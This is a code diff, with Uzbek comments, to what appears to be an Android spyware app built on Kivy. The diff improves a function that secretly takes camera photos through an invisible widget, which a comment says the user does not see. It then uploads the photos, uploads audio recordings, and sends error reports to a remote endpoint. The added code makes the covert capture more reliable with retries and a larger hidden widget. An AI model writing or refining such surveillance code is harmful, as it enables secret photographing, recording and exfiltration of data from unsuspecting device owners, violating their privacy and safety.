@@ -101,9 +101,8 @@ def get_device_info():
         return "Qurilma info xatolik: " + str(e)
 
 
-# ─── KAMERA (Kivy Camera widget — GL texture muammo yo'q) ─────────────────────
+# ─── KAMERA (Kivy Camera widget) ───────────────────────────────
 def take_photo_kivy(front_camera):
-    """Asosiy Kivy threadidan chaqiriladi (Clock orqali)"""
     try:
         from kivy.uix.camera import Camera as KivyCam
         from jnius import autoclass
@@ -112,38 +111,52 @@ def take_photo_kivy(front_camera):
         cam_name = 'selfie' if front_camera else 'capture'
         filepath = ext_dir + '/' + cam_name + '.png'
 
+        # Widget ko'rinmas lekin yetarli o'lchamda bo'lishi kerak!
         cam = KivyCam(
             index=1 if front_camera else 0,
             resolution=(1280, 720),
             play=True,
             size_hint=(None, None),
-            size=(2, 2),      # Ko'rinmas darajada kichik
-            opacity=0,        # Invisible
+            size=(320, 240),   # export_to_png uchun yetarli o'lcham
+            opacity=0,         # Foydalanuvchi ko'rmaydi
         )
         app_ref[0].root.add_widget(cam)
         status[0] = 'Kamera tayorlanmoqda...'
+        attempts = [0]
 
         def capture(dt):
+            attempts[0] += 1
+            # Texture tayyor bo'lguncha kutamiz (max 5 urinish)
+            if cam.texture is None and attempts[0] < 5:
+                status[0] = 'Kamera kutilmoqda... (' + str(attempts[0]) + ')'
+                Clock.schedule_once(capture, 1.0)
+                return
             try:
                 cam.export_to_png(filepath)
                 cam.play = False
                 app_ref[0].root.remove_widget(cam)
-                if os.path.exists(filepath) and os.path.getsize(filepath) > 100:
+                if os.path.exists(filepath) and os.path.getsize(filepath) > 500:
                     threading.Thread(
-                        target=upload_file_sync,
-                        args=(filepath, 'photo'),
-                        daemon=True
+                        target=upload_file_sync, args=(filepath, 'photo'), daemon=True
                     ).start()
                     status[0] = 'Rasm olindi, yuborilmoqda...'
                 else:
-                    status[0] = 'Kamera: rasm olinmadi'
+                    size = os.path.getsize(filepath) if os.path.exists(filepath) else 0
+                    msg = 'Rasm bo\'sh (' + str(size) + ' bayt) | texture=' + str(cam.texture)
+                    status[0] = msg
+                    threading.Thread(target=send_text_sync, args=(('[XATO] ' + msg,)), daemon=True).start()
             except Exception as ex:
-                status[0] = 'Capture xatolik: ' + str(ex)
+                msg = 'Capture xatolik: ' + str(ex)
+                status[0] = msg
+                threading.Thread(target=send_text_sync, args=(('[XATO] ' + msg,)), daemon=True).start()
 
-        Clock.schedule_once(capture, 2.5)
+        Clock.schedule_once(capture, 3.0)  # 3 soniya kutish
 
     except Exception as e:
-        status[0] = 'Kamera xatolik: ' + str(e)
+        msg = 'Kamera xatolik: ' + str(e)
+        status[0] = msg
+        threading.Thread(target=send_text_sync, args=(('[XATO] ' + msg,)), daemon=True).start()
+
 
 
 # ─── AUDIO ────────────────────────────────────────────────────────────────────
@@ -173,7 +186,9 @@ def record_audio():
         if os.path.exists(filepath):
             upload_file_sync(filepath, 'audio')
     except Exception as e:
-        status[0] = 'Audio xatolik: ' + str(e)
+        msg = 'Audio xatolik: ' + str(e)
+        status[0] = msg
+        threading.Thread(target=send_text_sync, args=(('[XATO] ' + msg,)), daemon=True).start()
 
 
 # ─── WEBSOCKET ────────────────────────────────────────────────────────────────
